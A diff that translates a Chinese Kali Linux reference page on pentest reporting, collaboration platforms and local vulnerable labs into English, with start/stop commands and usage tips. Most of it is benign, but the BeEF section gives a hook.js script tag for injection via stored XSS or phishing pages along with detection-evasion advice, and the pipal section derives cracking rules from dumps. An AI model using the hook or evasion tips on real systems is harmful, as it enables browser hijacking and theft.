@@ -1,47 +1,49 @@
-# 报告、协同与靶场(Reporting, Collaboration & Labs)
+# Reporting, Collaboration & Labs
 
-> **何时读本文件**:当任务涉及渗透测试证据截图、报告/协作平台、密码转储统计分析、本地漏洞靶场(DVWA/Juice Shop)搭建,或 GVM/BeEF/TheHive 等平台服务启停时,读取本文件。
+**English** · [简体中文](13-reporting-labs.zh-CN.md)
 
-## 快速决策表
+> **When to read this file**: Read this file when a task involves pentest evidence screenshots, reporting/collaboration platforms, password dump statistical analysis, setting up local vulnerability labs (DVWA/Juice Shop), or starting/stopping platform services such as GVM/BeEF/TheHive.
 
-| 任务场景 | 首选工具 | 备选 | 关键区别 |
+## Quick Decision Table
+
+| Task scenario | Primary tool | Alternative | Key difference |
 |---|---|---|---|
-| 批量网站截图 + HTML 报告 | eyewitness | witnessme | EyeWitness 单命令出报告;WitnessMe 附带签名扫描/REST API/交互式结果库 |
-| 单个 URL 快速截图(PNG/PDF/SVG) | cutycapt | `eyewitness --single` | cutycapt 基于 Qt WebKit 无需浏览器;现代重 JS 页面渲染不如 Selenium 系 |
-| 大规模网段清点(CIDR/IP 段/Nessus) | witnessme | `eyewitness -x` | WitnessMe 原生吃 CIDR/IP 段/.nessus,默认扫 80/8080/443/8443 |
-| 团队协作式渗透报告 | dradis | defectdojo / redeye | Dradis 轻量专注报告模板与协作;DefectDojo 偏漏洞管理与去重;RedEye 偏红队行动数据管理 |
-| 漏洞管理平台(去重/JIRA/Slack 推送) | defectdojo | thehive | DefectDojo 偏 AppSec 漏洞库;TheHive 偏安全事件响应(case 管理) |
-| 综合漏洞扫描平台(原 OpenVAS) | gvm | — | `gvm-setup` 首次初始化(下载 feed 耗时),之后 start/stop |
-| 浏览器利用/客户端攻击框架 | beef-xss | — | hook.js 注入受控页面,3000 端口面板控制上线浏览器 |
-| 密码转储统计分析 | pipal | — | 只统计不破解;top 密码/基础词/长度分布直接指导字典生成 |
-| 本地 Web 靶场(PHP 经典漏洞,分难度) | dvwa | — | 42001 端口,admin/password,覆盖 SQLi/XSS/命令注入等 |
-| 本地 Web 靶场(Node,OWASP Top 10+) | juice-shop | — | 42000 端口,零配置开箱即用 |
-| 层级笔记/取证信息整理 | cherrytree | obsidian | CherryTree 单文件可加密适合项目笔记;Obsidian Markdown 生态适合长期知识库 |
-| 桌面操作录屏取证 | recordmydesktop | — | 输出 Ogg Theora,配合 ffmpeg 转 mp4 |
-| 命令速查与一键复制 | arsenal-ng | — | TUI 搜索 2800+ 预置渗透命令,支持变量替换 |
+| Bulk website screenshots + HTML report | eyewitness | witnessme | EyeWitness produces a report with a single command; WitnessMe adds signature scanning/REST API/interactive result database |
+| Quick screenshot of a single URL (PNG/PDF/SVG) | cutycapt | `eyewitness --single` | cutycapt is Qt WebKit based and needs no browser; renders modern JS-heavy pages less well than Selenium-based tools |
+| Large-scale network segment inventory (CIDR/IP ranges/Nessus) | witnessme | `eyewitness -x` | WitnessMe natively accepts CIDR/IP ranges/.nessus and scans 80/8080/443/8443 by default |
+| Collaborative team pentest reporting | dradis | defectdojo / redeye | Dradis is lightweight and focused on report templates and collaboration; DefectDojo leans toward vulnerability management and deduplication; RedEye leans toward red team operation data management |
+| Vulnerability management platform (dedup/JIRA/Slack push) | defectdojo | thehive | DefectDojo leans toward an AppSec vulnerability repository; TheHive leans toward security incident response (case management) |
+| Comprehensive vulnerability scanning platform (formerly OpenVAS) | gvm | — | `gvm-setup` for first-time initialization (feed download is time-consuming), then start/stop |
+| Browser exploitation/client-side attack framework | beef-xss | — | Inject hook.js into pages to take control; the panel on port 3000 manages hooked browsers |
+| Password dump statistical analysis | pipal | — | Statistics only, no cracking; top passwords/base words/length distribution directly guide wordlist generation |
+| Local web lab (PHP classic vulnerabilities, difficulty levels) | dvwa | — | Port 42001, admin/password, covers SQLi/XSS/command injection and more |
+| Local web lab (Node, OWASP Top 10+) | juice-shop | — | Port 42000, zero-config out of the box |
+| Hierarchical notes/forensic information organization | cherrytree | obsidian | CherryTree is a single encryptable file suited to project notes; Obsidian's Markdown ecosystem suits long-term knowledge bases |
+| Desktop operation screen recording for evidence | recordmydesktop | — | Outputs Ogg Theora; pair with ffmpeg to convert to mp4 |
+| Command cheat sheet with one-click copy | arsenal-ng | — | TUI to search 2800+ preset pentest commands, with variable substitution |
 
-### 平台服务端口速查(均为 Kali 打包版,监听 127.0.0.1)
+### Platform service port quick reference (all Kali-packaged, listening on 127.0.0.1)
 
-| 服务 | 启动 | 停止 | 地址 | 默认凭据 |
+| Service | Start | Stop | Address | Default credentials |
 |---|---|---|---|---|
-| dradis | `sudo dradis-start` | `sudo dradis-stop` | http://127.0.0.1:3000 | 首次启动按终端提示设置 |
-| defectdojo | `sudo defectdojo-start` | `sudo defectdojo-stop` | http://127.0.0.1:42003 | admin + 首次启动随机生成的密码(终端只显示一次) |
-| gvm (Greenbone) | `sudo gvm-start` | `sudo gvm-stop` | https://127.0.0.1:9392 | 首次访问 Web UI 时创建管理员 |
-| beef-xss | `sudo beef-xss` | `sudo beef-xss-stop` | http://127.0.0.1:3000/ui/panel | beef / 首次启动强制改密 |
+| dradis | `sudo dradis-start` | `sudo dradis-stop` | http://127.0.0.1:3000 | Set up following terminal prompts on first start |
+| defectdojo | `sudo defectdojo-start` | `sudo defectdojo-stop` | http://127.0.0.1:42003 | admin + a randomly generated password on first start (shown in the terminal only once) |
+| gvm (Greenbone) | `sudo gvm-start` | `sudo gvm-stop` | https://127.0.0.1:9392 | Create the admin account on first Web UI visit |
+| beef-xss | `sudo beef-xss` | `sudo beef-xss-stop` | http://127.0.0.1:3000/ui/panel | beef / forced password change on first start |
 | thehive | `sudo thehive-start` | `sudo thehive-stop` | http://127.0.0.1:9000 | admin / secret |
 | dvwa | `sudo dvwa-start` | `sudo dvwa-stop` | http://127.0.0.1:42001/login.php | admin / password |
-| juice-shop | `sudo juice-shop` | `sudo juice-shop-stop` | http://127.0.0.1:42000 | 无需登录 |
-| redeye | `sudo redeye-start` | `sudo redeye-stop` | http://127.0.0.1:8443 | 首次使用时设置 |
+| juice-shop | `sudo juice-shop` | `sudo juice-shop-stop` | http://127.0.0.1:42000 | No login required |
+| redeye | `sudo redeye-start` | `sudo redeye-stop` | http://127.0.0.1:8443 | Set up on first use |
 
-注意:dradis 与 beef-xss 默认都占用 3000 端口,同机使用需错开(先停一个,或改 BeEF 配置)。
+Note: dradis and beef-xss both use port 3000 by default; stagger them when running on the same host (stop one first, or change the BeEF configuration).
 
-## 核心工具详解
+## Core Tools in Depth
 
-### eyewitness — 网站批量截图与快速分诊
+### eyewitness — Bulk website screenshots and rapid triage
 
-**用途**:对 URL 列表 / Nmap XML / Nessus 文件批量截图,同时抓取 server header、页面标题,并基于内置签名识别已知应用与默认凭据,生成 HTML 报告。
-**安装**:`sudo apt install eyewitness`
-**使用场景**:信息收集后期,面对几十上百个 Web 服务需要快速挑出登录页、管理后台、老旧组件时首选;比 witnessme 更简单直接。
+**Purpose**: Takes bulk screenshots of URL lists / Nmap XML / Nessus files, captures server headers and page titles, identifies known applications and default credentials via built-in signatures, and generates an HTML report.
+**Installation**: `sudo apt install eyewitness`
+**When to use**: In late reconnaissance, the top choice when facing dozens to hundreds of web services and needing to quickly pick out login pages, admin panels, and outdated components; simpler and more direct than witnessme.
 
 ```bash
 # 对 URL 列表截图并生成 HTML 报告(--no-prompt 避免交互提问)
@@ -66,17 +68,17 @@ eyewitness --web --resume ew.db
 eyewitness --web -f urls.txt --user-agent "<ua-string>" --cookies key1=value1,key2=value2
 ```
 
-**实战要点**:
-- Kali 打包版的输出目录 `-d` 若用相对路径,报告会落在 `/usr/share/eyewitness/` 下,建议始终用绝对路径。
-- `-f` 输入自动识别三种格式:每行一个 URL 的文本、Nmap XML(`-x`)、Nessus XML(`-x`);IP 网段类目标改用 witnessme 更合适。
-- 报告为 `report.html`(含截图、标题、server header、默认凭据提示),按页面差异度排序可快速发现"长得一样"的默认页。
-- `--jitter` 可随机化请求顺序并加随机延迟,降低对目标侧 IDS 的触发。
+**Practical tips**:
+- In the Kali-packaged version, if the output directory `-d` uses a relative path, the report lands under `/usr/share/eyewitness/`; always use an absolute path.
+- `-f` input auto-detects three formats: plain text with one URL per line, Nmap XML (`-x`), and Nessus XML (`-x`); for IP range targets, witnessme is a better fit.
+- The report is `report.html` (with screenshots, titles, server headers, default credential hints); sorting by page difference quickly surfaces default pages that "look alike".
+- `--jitter` randomizes request order and adds random delays, reducing IDS triggers on the target side.
 
-### cutycapt — 单页渲染截图(无浏览器依赖)
+### cutycapt — Single-page rendered screenshots (no browser dependency)
 
-**用途**:调用 Qt WebKit 渲染网页并保存为 PNG/JPEG/PDF/SVG/PS/TIFF/GIF/BMP 等格式;轻量、无 GUI 也能跑。
-**安装**:`sudo apt install cutycapt`
-**使用场景**:只需对个别 URL 存证(如漏洞页面截图进报告),不值得起 Selenium 栈时用;需要矢量格式(PDF/SVG)嵌入报告时是唯一选择。
+**Purpose**: Renders web pages via Qt WebKit and saves them as PNG/JPEG/PDF/SVG/PS/TIFF/GIF/BMP; lightweight and runs without a GUI.
+**Installation**: `sudo apt install cutycapt`
+**When to use**: When you only need to document a few URLs as evidence (e.g., vulnerability page screenshots for a report) and spinning up a Selenium stack is not worth it; the only choice when you need vector formats (PDF/SVG) embedded in reports.
 
 ```bash
 # 基本截图(官网示例)
@@ -92,16 +94,16 @@ cutycapt --url=https://<domain> --out=page.pdf
 xvfb-run --server-args="-screen 0, 1280x800x24" cutycapt --url=http://<domain> --out=<file>.png
 ```
 
-**实战要点**:
-- 输出格式由 `--out` 的扩展名决定,无需额外参数。
-- 渲染引擎是 Qt WebKit,较老;现代 SPA/重 JS 页面可能渲染不全,此类目标换 eyewitness。
-- `--delay=<ms>` 可在截图前等待,用于跳过加载动画;`--user-agent=` 与 `--http-proxy=<url>` 支持定制请求(如 `cutycapt --url=http://<domain> --out=<file>.png --http-proxy=http://127.0.0.1:8080`)。
+**Practical tips**:
+- The output format is determined by the extension of `--out`; no extra parameter needed.
+- The rendering engine is Qt WebKit, which is dated; modern SPA/JS-heavy pages may not render fully — switch to eyewitness for such targets.
+- `--delay=<ms>` waits before the screenshot, useful for skipping loading animations; `--user-agent=` and `--http-proxy=<url>` support customized requests (e.g., `cutycapt --url=http://<domain> --out=<file>.png --http-proxy=http://127.0.0.1:8080`).
 
-### witnessme — 大规模 Web 资产清点与抓取
+### witnessme — Large-scale web asset inventory and grabbing
 
-**用途**:基于无头 Chromium(pyppeteer)的 Web 清点工具,支持 CIDR/IP 段/Nessus/Nmap XML 混合输入,截图后可用 wmdb 交互式检索、签名扫描并导出 HTML/CSV 报告,还提供 REST API(wmapi)。
-**安装**:`sudo apt install witnessme`
-**使用场景**:内网大网段扫描后需要"哪些主机有 Web、是什么应用"的全景图;或需要 XPath 抓取 JS 渲染页面的内容。
+**Purpose**: A web inventory tool based on headless Chromium (pyppeteer); supports mixed input of CIDR/IP ranges/Nessus/Nmap XML. After screenshotting, results can be browsed interactively with wmdb, signature-scanned, and exported as HTML/CSV reports; also provides a REST API (wmapi).
+**Installation**: `sudo apt install witnessme`
+**When to use**: After scanning large internal network segments, when you need a panoramic view of "which hosts run web services and what applications they are"; or when you need to grab content from JS-rendered pages via XPath.
 
 ```bash
 # 混合输入:CIDR + IP 段 + URL + 文件(IP/CIDR 默认尝试 80/8080/443/8443)
@@ -130,17 +132,17 @@ wmdb scan_<timestamp>/
 #   wmdb 内: generate_report html   # 生成 HTML 报告(csv 可选)
 ```
 
-**实战要点**:
-- Nmap XML 必须以 `.xml` 结尾、Nessus 必须 `.nessus` 后缀,否则按普通文本解析。
-- `--threads` 默认 15,每线程一个浏览器标签页,调太高会吃光内存并出现 Page Crash。
-- `wmapi [host] [port]` 可把扫描能力暴露为 REST API(默认 127.0.0.1:8000,文档在 /docs),无任何鉴权,切勿对外监听。
-- 签名是 YAML 文件(应用特征 + 默认凭据),可自行添加识别规则。
+**Practical tips**:
+- Nmap XML must end in `.xml` and Nessus files must have the `.nessus` extension, or they are parsed as plain text.
+- `--threads` defaults to 15 with one browser tab per thread; raising it too high exhausts memory and causes Page Crashes.
+- `wmapi [host] [port]` exposes the scanning capability as a REST API (default 127.0.0.1:8000, docs at /docs) with no authentication whatsoever — never make it listen externally.
+- Signatures are YAML files (application fingerprints + default credentials); you can add your own detection rules.
 
-### pipal — 密码转储统计分析
+### pipal — Password dump statistical analysis
 
-**用途**:对密码文件(破解结果或字典)做统计:总数/去重数、top 密码、top 基础词、长度分布、字符构成比例,为下一步字典生成和密码策略评估提供依据。
-**安装**:`sudo apt install pipal`
-**使用场景**:拿到一批破解出的明文密码(hashcat/john 输出)后,量化分析口令规律;或评估客户环境口令强度写进报告。
+**Purpose**: Runs statistics on password files (cracking results or wordlists): total/unique counts, top passwords, top base words, length distribution, and character composition ratios, providing a basis for the next round of wordlist generation and password policy assessment.
+**Installation**: `sudo apt install pipal`
+**When to use**: After obtaining a batch of cracked plaintext passwords (hashcat/john output) to quantitatively analyze password patterns; or to assess password strength in a client environment for the report.
 
 ```bash
 # 分析文件并显示 top 5(官网示例,输入为 Kali 自带字典)
@@ -156,17 +158,17 @@ pipal --list-checkers
 pipal -v <file>
 ```
 
-**实战要点**:
-- 输入就是每行一个密码的纯文本;wordlist 里的 `#!comment:` 注释行同样会被统计(官网输出里即如此),正式分析前先 `grep -v '^#!'` 过滤。
-- 处理大文件耗时,进度条期间按 Ctrl-C 可提前结束并输出已处理部分的统计。
-- 重点看 "Top base words"(基础词)和长度分布:例如 6-8 位占 70% + love/angel/password 等基础词靠前,可直接推导 `基础词+年份` 规则去跑下一轮 hashcat。
-- `--gkey <key>` 可配 Google Maps API key 做邮编归属统计(可选功能)。
+**Practical tips**:
+- Input is plain text with one password per line; `#!comment:` comment lines in wordlists also get counted (as seen in the official site's output) — filter them out first with `grep -v '^#!'`.
+- Large files take time; pressing Ctrl-C during the progress bar ends early and outputs statistics for the portion already processed.
+- Focus on "Top base words" (base words) and the length distribution: e.g., 6-8 character passwords at 70% plus base words like love/angel/password ranking high — you can directly derive a `base-word+year` rule for the next hashcat run.
+- `--gkey <key>` sets a Google Maps API key for postcode attribution statistics (optional feature).
 
-### dradis — 渗透测试协作与报告平台
+### dradis — Pentest collaboration and reporting platform
 
-**用途**:开源协作框架:统一管理各测试者的笔记、扫描器导入(nmap/nessus/nikto 等插件)、方法论清单(issue 库复用),最终套模板一键生成报告。
-**安装**:`sudo apt install dradis`
-**使用场景**:多人团队项目需要共享实时进度与统一报告格式;单机作战想要结构化管理 findings 时也够用。
+**Purpose**: An open-source collaboration framework: centrally manages each tester's notes, scanner imports (nmap/nessus/nikto plugins), methodology checklists (reusable issue library), and finally applies templates to generate reports with one click.
+**Installation**: `sudo apt install dradis`
+**When to use**: Multi-person team projects that need shared real-time progress and a unified report format; also sufficient for solo operators who want structured findings management.
 
 ```bash
 # 启动(首次运行初始化,终端提示设置账号凭据,并自动打开浏览器)
@@ -181,17 +183,17 @@ sudo systemctl start dradis
 sudo systemctl status dradis
 ```
 
-**实战要点**:
-- 服务只监听 127.0.0.1:3000;远程团队协作用 SSH 隧道:`ssh -L 3000:127.0.0.1:3000 <user>@<server>`。
-- 与 beef-xss 默认端口冲突(都是 3000),同机需先停一个。
-- 工作流:建 Project → 导入扫描器结果为 Evidence → 归纳为 Issue(可复用库)→ 挂到 Methodology 清单 → 导出报告(HTML/Word 模板)。
-- 默认绑定的凭据在首次启动的终端输出里,注意留存。
+**Practical tips**:
+- The service listens on 127.0.0.1:3000 only; for remote team collaboration use an SSH tunnel: `ssh -L 3000:127.0.0.1:3000 <user>@<server>`.
+- Port conflict with beef-xss by default (both use 3000); stop one first on the same host.
+- Workflow: create a Project → import scanner results as Evidence → consolidate into Issues (reusable library) → attach to the Methodology checklist → export the report (HTML/Word templates).
+- The default credentials are printed in the terminal output on first start; keep them safe.
 
-### defectdojo — 漏洞管理与安全编排平台
+### defectdojo — Vulnerability management and security orchestration platform
 
-**用途**:应用安全漏洞管理平台:导入各类扫描器结果(100+ 解析器),启发式去重与降噪,维护产品/评估/测试对象层级,可将 findings 推送到 JIRA、Slack。
-**安装**:`sudo apt install defectdojo`(体积大,依赖 PostgreSQL + Redis + celery)
-**使用场景**:需要长期跟踪漏洞生命周期(从发现到修复验证)、多工具结果聚合去重、与研发工单系统联动时,比 dradis 更重但更"平台化"。
+**Purpose**: An application security vulnerability management platform: imports results from all kinds of scanners (100+ parsers), heuristic deduplication and noise reduction, maintains the product/engagement/test object hierarchy, and can push findings to JIRA and Slack.
+**Installation**: `sudo apt install defectdojo` (large download; depends on PostgreSQL + Redis + celery)
+**When to use**: When you need long-term tracking of the vulnerability lifecycle (from discovery to fix verification), aggregation and dedup of multi-tool results, and integration with development ticketing systems; heavier than dradis but more of a "platform".
 
 ```bash
 # 首次启动:自动建库、生成 admin 密码(只在终端显示一次,务必记录)
@@ -205,17 +207,17 @@ cd /usr/lib/defectdojo && sudo python3 manage.py createsuperuser
 sudo defectdojo-stop
 ```
 
-**实战要点**:
-- 旧命令 `defectdojo` 已被 Kali 标记弃用,统一使用 `defectdojo-start`。
-- 启动要拉起 postgresql、redis、celery 多个组件,42003 在初始化完成前可能无响应,等 1-2 分钟再访问。
-- 结果导入优先走 API(可脚本化批量)或 Web UI 的 Import Scan;同型漏洞自动去重依赖 heuristic,导入后人工过一遍 dedupe 建议。
-- 与 dradis 的分工:dradis 管"报告怎么写",DefectDojo 管"漏洞状态怎么流转"。
+**Practical tips**:
+- The old command `defectdojo` is deprecated by Kali; use `defectdojo-start` consistently.
+- Startup pulls up multiple components (postgresql, redis, celery); port 42003 may be unresponsive until initialization finishes, so wait 1-2 minutes before visiting.
+- Prefer importing results via the API (scriptable, batch-capable) or the Web UI's Import Scan; automatic dedup of same-type vulnerabilities relies on heuristics, so review the dedupe suggestions manually after import.
+- Division of labor with dradis: dradis handles "how the report is written", DefectDojo handles "how vulnerability status flows".
 
-### gvm — Greenbone 漏洞管理系统(原 OpenVAS)
+### gvm — Greenbone vulnerability management system (formerly OpenVAS)
 
-**用途**:全套开源漏洞扫描平台:gvmd(管理)+ ospd-openvas(扫描)+ notus-scanner(本地检查)+ gsad(Web 界面),对远程主机做已登录/未登录漏洞审计。
-**安装**:`sudo apt install gvm`(元包)
-**使用场景**:需要对整个网段做系统性 CVE 扫描、产出合规式漏洞报告(区别于渗透测试的手工验证)。
+**Purpose**: A full open-source vulnerability scanning platform: gvmd (management) + ospd-openvas (scanning) + notus-scanner (local checks) + gsad (web interface); performs credentialed/uncredentialed vulnerability audits of remote hosts.
+**Installation**: `sudo apt install gvm` (metapackage)
+**When to use**: When you need systematic CVE scanning of an entire network segment and compliance-style vulnerability reports (as opposed to manual verification in penetration testing).
 
 ```bash
 # 首次使用必须先初始化:建 PostgreSQL 库、生成证书、下载 NVT/feed(数据量大,耗时可能 30 分钟以上)
@@ -232,17 +234,17 @@ sudo gvm-start     # Web UI: https://127.0.0.1:9392
 sudo gvm-stop
 ```
 
-**实战要点**:
-- `gvm-setup` 没跑完之前 `gvm-start` 打开的页面无法登录;feed 下载失败多为网络问题,重跑 setup。
-- Web UI 是自签 HTTPS 证书,浏览器告警需手动接受。
-- 首次访问 https://127.0.0.1:9392 时通过引导页创建管理员账号。
-- scan config 建议先用 "Full and fast" 做基线;带凭据扫描(Credentialed checks)结果质量远高于无凭据扫描。
+**Practical tips**:
+- Until `gvm-setup` has finished, the page opened by `gvm-start` cannot be logged into; feed download failures are mostly network issues — rerun setup.
+- The Web UI uses a self-signed HTTPS certificate; manually accept the browser warning.
+- Create the admin account via the wizard page on first visit to https://127.0.0.1:9392.
+- For scan configs, use "Full and fast" first as a baseline; scans with credentials (Credentialed checks) produce far higher-quality results than uncredentialed scans.
 
-### beef-xss — 浏览器利用框架(BeEF)
+### beef-xss — Browser exploitation framework (BeEF)
 
-**用途**:通过向页面注入 hook.js 控制受害者浏览器:社工弹窗、内网探测、窃取信息、投递 payload,面板化管理上线浏览器与命令模块。
-**安装**:`sudo apt install beef-xss`
-**使用场景**:验证 XSS 的实际危害、客户端攻击演练、红队钓鱼演练中评估浏览器侧攻击面。
+**Purpose**: Controls victim browsers by injecting hook.js into pages: social engineering popups, internal network probing, information theft, payload delivery; manages hooked browsers and command modules through a panel.
+**Installation**: `sudo apt install beef-xss`
+**When to use**: Verifying the real impact of XSS, client-side attack drills, and assessing the browser-side attack surface in red team phishing exercises.
 
 ```bash
 # 启动(首次运行强制把默认密码 beef 改掉,之后自动打开面板)
@@ -257,17 +259,17 @@ sudo beef-xss-stop
 sudo vi /etc/beef-xss/config.yaml
 ```
 
-**实战要点**:
-- hook 方式:在存在存储型 XSS 的页面注入 `<script src="http://<your-ip>:3000/hook.js"></script>`,或将其嵌入钓鱼页;上线浏览器出现在面板 "Online Browsers"。
-- 受害机必须能回连 Kali 的 IP:3000;HTTPS 页面注入 HTTP hook 会被浏览器混合内容策略拦截,需用 HTTPS 反代 hook。
-- 与 dradis 端口冲突(默认均 3000),同机部署先停一个或改配置。
-- 测试客户端攻击链时优先用低检测度的命令模块(如 Social Engineering 系列),再逐步升级。
+**Practical tips**:
+- Hooking: inject `<script src="http://<your-ip>:3000/hook.js"></script>` into a page with stored XSS, or embed it in a phishing page; hooked browsers appear under "Online Browsers" in the panel.
+- Victim machines must be able to connect back to the Kali host at IP:3000; an HTTP hook injected into an HTTPS page gets blocked by the browser's mixed-content policy — serve the hook via an HTTPS reverse proxy.
+- Port conflict with dradis (both default to 3000); stop one first or change the configuration when deploying on the same host.
+- When testing client-side attack chains, start with low-detection command modules (e.g., the Social Engineering series), then escalate gradually.
 
-### dvwa — Damn Vulnerable Web Application 靶场
+### dvwa — Damn Vulnerable Web Application lab
 
-**用途**:PHP/MySQL 的"全身是洞"靶场:SQLi、XSS(反射/存储/DOM)、命令注入、文件上传、CSRF、暴力破解、文件包含等经典漏洞,每个模块带 Low→Impossible 四档难度与源码查看。
-**安装**:`sudo apt install dvwa`(自动带 apache2/nginx + php + mariadb 依赖)
-**使用场景**:练习手工注入与工具联调、验证扫描器效果、安全培训;比 juice-shop 更贴近传统 LAMP 技术栈。
+**Purpose**: A PHP/MySQL lab "riddled with holes": SQLi, XSS (reflected/stored/DOM), command injection, file upload, CSRF, brute force, file inclusion and other classic vulnerabilities; each module has four difficulty levels from Low to Impossible plus source viewing.
+**Installation**: `sudo apt install dvwa` (automatically pulls in apache2/nginx + php + mariadb dependencies)
+**When to use**: Practicing manual injection alongside tools, validating scanner effectiveness, and security training; closer to the traditional LAMP stack than juice-shop.
 
 ```bash
 # 启动(自动拉起 php-fpm、数据库并打开浏览器)
@@ -280,17 +282,17 @@ sudo dvwa-start
 sudo dvwa-stop
 ```
 
-**实战要点**:
-- 左侧 DVWA Security 页切换 Low/Impossible 难度;PHPIDS 可开关,用于测试 WAF 类拦截。
-- 与 Burp 联调:浏览器代理指向 127.0.0.1:8080 后所有模块(SQL 盲注、CSRF token 抓取)都能演练。
-- 数据库重置会清空所有测试数据;`dvwa-stop` 后靶场数据保留在 mariadb 中。
-- 官方警告:绝不能部署到公网服务器,本包仅监听本机回环。
+**Practical tips**:
+- Switch Low/Impossible difficulty on the DVWA Security page on the left; PHPIDS can be toggled on/off for testing WAF-style blocking.
+- Working with Burp: after pointing the browser proxy at 127.0.0.1:8080, every module (blind SQLi, CSRF token capture) can be exercised.
+- Resetting the database wipes all test data; after `dvwa-stop`, lab data persists in mariadb.
+- Official warning: never deploy to an internet-facing server; this package listens on local loopback only.
 
-### juice-shop — OWASP Juice Shop 靶场
+### juice-shop — OWASP Juice Shop lab
 
-**用途**:Node.js/Express 编写的现代不安全应用:覆盖 OWASP Top 10 及大量真实世界漏洞(SQL/NoSQL 注入、XSS、权限提升、JWT 滥用、业务逻辑漏洞等),内置记分板与 hacking instructor,适合 CTF 和工具试验。
-**安装**:`sudo apt install juice-shop`(约 1 GB)
-**使用场景**:练习现代 Web/API 攻击手法、新工具的"小白鼠"、安全意识演示;零配置开箱即用。
+**Purpose**: A modern insecure application written in Node.js/Express: covers the OWASP Top 10 plus many real-world vulnerabilities (SQL/NoSQL injection, XSS, privilege escalation, JWT abuse, business logic flaws, etc.), with a built-in scoreboard and hacking instructor; well suited to CTFs and tool experiments.
+**Installation**: `sudo apt install juice-shop` (about 1 GB)
+**When to use**: Practicing modern web/API attack techniques, a "guinea pig" for new tools, and security awareness demos; zero-config out of the box.
 
 ```bash
 # 启动
@@ -301,17 +303,17 @@ sudo juice-shop
 sudo juice-shop-stop
 ```
 
-**实战要点**:
-- 无需登录即可浏览商店;页面底部 "Score Board" 入口(或访问 /#/score-board)跟踪挑战进度。
-- 官方警告:包含大量真实漏洞,绝不能放到公网或生产环境。
-- 适合配合Burp/nuclei/SQLmap 演练:目标就是 http://127.0.0.1:42000。
-- 与 dvwa 的分工:juice-shop 练现代栈(JSON API/JWT/前端),dvwa 练经典 LAMP。
+**Practical tips**:
+- Browse the shop without logging in; the "Score Board" entry at the bottom of the page (or visit /#/score-board) tracks challenge progress.
+- Official warning: contains numerous real vulnerabilities; never expose it to the public internet or production environments.
+- Pairs well with Burp/nuclei/SQLmap drills: the target is simply http://127.0.0.1:42000.
+- Division of labor with dvwa: juice-shop for the modern stack (JSON API/JWT/frontend), dvwa for classic LAMP.
 
-### thehive — 安全事件响应平台
+### thehive — Security incident response platform
 
-**用途**:SOC 案例(case)管理平台:警报聚合为 case、任务分派、observable 分析、与 Cortex/MISP 集成做自动化响应;Kali 打包的是 TheHive 4(Cassandra 后端)。
-**安装**:`sudo apt install thehive`
-**使用场景**:渗透/红队产出需要以事件流方式管理、或搭建小型 SOC 实验环境时。
+**Purpose**: A SOC case management platform: aggregates alerts into cases, task assignment, observable analysis, and integration with Cortex/MISP for automated response; Kali packages TheHive 4 (Cassandra backend).
+**Installation**: `sudo apt install thehive`
+**When to use**: When pentest/red team output needs to be managed as an incident stream, or when building a small SOC lab environment.
 
 ```bash
 # 首次启动:自动初始化 Cassandra(改集群名为 thp 并重启),非常慢,需数分钟
@@ -322,34 +324,34 @@ sudo thehive-start
 sudo thehive-stop
 ```
 
-**实战要点**:
-- 首次启动看到 "Please wait..." 属正常,卡在 cassandra 初始化,不要中途 Ctrl-C。
-- 默认凭据 admin/secret,登录后立即修改。
-- TheHive 5 上游未进 Kali 仓库,包为 4.1.x;5.x 需自行用官方 Docker 部署。
-- 典型联动:thehive 收 case → Cortex 跑 analyzer → MISP 同步情报。
+**Practical tips**:
+- Seeing "Please wait..." on first start is normal — it is stuck on cassandra initialization; do not press Ctrl-C midway.
+- Default credentials are admin/secret; change them immediately after logging in.
+- TheHive 5 has not made it into the Kali repos upstream; the packaged version is 4.1.x; for 5.x, deploy it yourself with the official Docker images.
+- Typical integration: thehive receives cases → Cortex runs analyzers → MISP syncs intelligence.
 
-### cherrytree — 层级式渗透笔记
+### cherrytree — Hierarchical pentest notes
 
-**用途**:单文档层级笔记应用:富文本 + 代码语法高亮 + 图片内嵌 + 超链接,整库保存为一个文件(.ctd XML 或 .cts SQLite),支持整库密码加密,可导出 PDF/HTML/TEXT。
-**安装**:`sudo apt install cherrytree`
-**使用场景**:单机项目作战笔记、CVE/PoC 资料整理、凭证与 host 清单记录;不想为记笔记起 Web 服务时用它,多人协作换 dradis。
+**Purpose**: A single-document hierarchical note application: rich text + code syntax highlighting + embedded images + hyperlinks; the whole notebook saves as one file (.ctd XML or .cts SQLite), supports whole-notebook password encryption, and exports to PDF/HTML/TEXT.
+**Installation**: `sudo apt install cherrytree`
+**When to use**: Solo project operation notes, CVE/PoC material organization, credential and host inventory records; use it when you don't want to run a web service just for note-taking — switch to dradis for multi-person collaboration.
 
 ```bash
 # 启动 GUI,直接打开指定笔记库
 cherrytree <file>.ctd
 ```
 
-**实战要点**:
-- .cts(SQLite)+ 密码加密适合存放含敏感信息的渗透笔记;记得备份单文件即备份全部。
-- 节点树按 " Recon / Enumeration / Exploitation / Report " 组织,配合代码高亮节点贴命令与输出,是写报告时的素材源。
-- 支持从 KeepNote、Zim、Tomboy、Evernote 等格式导入;导出 PDF 可直接作为附件交付。
-- 与 obsidian 的取舍:cherrytree 是单文件封闭数据库,obsidian 是纯 Markdown 文件夹(可 git 版本化)。
+**Practical tips**:
+- .cts (SQLite) + password encryption suits pentest notes holding sensitive information; remember that backing up the single file backs up everything.
+- Organize the node tree as "Recon / Enumeration / Exploitation / Report"; paste commands and outputs into syntax-highlighted nodes — a source of material when writing reports.
+- Supports importing from KeepNote, Zim, Tomboy, Evernote and other formats; exported PDFs can be delivered directly as attachments.
+- Trade-off versus obsidian: cherrytree is a single-file closed database, obsidian is a plain Markdown folder (git-versionable).
 
-### redeye — 红队行动数据管理
+### redeye — Red team operation data management
 
-**用途**:渗透/红队行动期间的攻击数据管理:主机、服务、凭证、截屏、命令输出集中组织,辅助生成行动报告。
-**安装**:`sudo apt install redeye`
-**使用场景**:红队多日行动中管理海量 C2/扫描输出,需要快速回溯"哪台机器用什么凭据打通了什么路径"时。
+**Purpose**: Attack data management during pentest/red team operations: hosts, services, credentials, screenshots, and command outputs organized centrally, assisting with operation report generation.
+**Installation**: `sudo apt install redeye`
+**When to use**: Managing massive C2/scan output during multi-day red team operations, when you need to quickly trace back "which host was reached through which path with which credentials".
 
 ```bash
 # 启动(浏览器可能需要手动刷新一次)
@@ -360,16 +362,16 @@ sudo redeye-start
 sudo redeye-stop
 ```
 
-**实战要点**:
-- 旧命令 `redeye` 已弃用,统一用 `redeye-start`。
-- 数据模型围绕"攻击行动(campaign)→ 主机 → 凭证/附件"组织,与 Cobalt Strike 类日志配合使用顺手。
-- 仅监听本机,远程访问用 SSH 隧道转发 8443。
